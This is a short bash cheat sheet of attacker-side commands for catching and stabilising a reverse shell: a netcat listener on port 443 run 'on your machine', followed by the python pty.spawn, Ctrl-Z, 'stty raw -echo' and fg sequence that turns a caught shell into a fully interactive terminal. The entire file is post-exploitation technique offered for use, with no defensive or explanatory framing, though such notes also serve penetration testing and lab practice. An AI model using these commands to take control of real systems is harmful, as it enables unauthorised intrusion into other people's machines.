#!/bin/bash

# On your machine
nc -n -l -vvv -p 443

# Commands to spawn an interactive shell
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
# To bind your keyboard signals to the shell
stty raw -echo
fg #Execute blindly